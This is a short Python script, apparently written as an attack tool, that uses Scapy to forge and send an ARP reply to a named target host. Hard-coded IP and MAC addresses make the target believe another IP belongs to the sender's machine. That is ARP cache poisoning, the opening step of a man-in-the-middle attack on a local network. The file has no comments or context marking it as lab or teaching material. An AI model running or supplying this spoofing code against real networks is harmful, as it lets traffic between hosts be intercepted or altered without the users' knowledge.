
from scapy.all import ARP, Ether, send


stan_ip = "10.33.67.174"

mac_stan = "f2:39:c5:c0:07:e5"

mon_ip = "10.33.73.77"  


arp_response = ARP(op=2, pdst=stan_ip, psrc=mon_ip, hwdst=mac_stan)
ether = Ether(dst=mac_stan) / arp_response


send(ether, verbose=0)